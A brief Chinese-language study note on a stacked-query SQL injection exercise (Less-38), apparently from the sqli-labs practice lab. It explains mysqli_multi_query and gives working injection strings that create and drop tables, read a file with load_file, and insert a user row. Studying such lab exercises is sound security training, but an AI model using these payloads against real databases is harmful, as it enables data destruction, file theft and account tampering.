Less-38: GET - Stacked Query Injection - String

直接单引号字符型注入，没区别？

冲浪检查，原来Stacked Injections意思是堆叠注入，其实就是通过注入一次性执行多条sql语句

涉及到源码得这个函数：mysqli_multi_query($con1, $sql)

局限性：代码中能注入执行多条语句，但是不一定会回显后续语句的执行结果

于是乎创建一个新表：?id=99';create table test like users; %23，结果创建成功

一些利用：

创建一个表select * from users where id=1;create table test like users;

删除表：drop table test;

加载文件：select load_file('c:/tmpupbbn.php');

插入数据：insert into users(id,username,password) values('100','new','new');
